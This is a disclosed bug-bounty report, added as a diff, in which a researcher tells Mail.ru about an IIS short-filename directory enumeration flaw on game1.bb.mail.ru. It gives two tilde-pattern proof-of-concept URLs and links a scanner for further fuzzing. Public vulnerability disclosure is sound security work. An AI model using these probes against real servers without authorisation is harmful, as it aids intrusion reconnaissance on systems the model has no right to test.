@@ -1,0 +1,25 @@
+ReportLink:https://hackerone.com/reports/15652
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/bigbear
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:28.06.2015 21:14:09
+
+Summary:
+
+Приветствую!
+
+Сервер с багой : game1.bb.mail.ru
+
+Можно попытаться перебирать каталоги за счёт уязвимости в IIS.
+
+PoC
+
+game1.bb.mail.ru/images/*~1*/a.aspx?aspxerrorpath=/
+game1.bb.mail.ru/images/*~2*/a.aspx?aspxerrorpath=/
+
+Можно запустить сканнер и пофаззить эту багу более конкретно
+
+http://code.google.com/p/iis-shortname-scanner-poc/
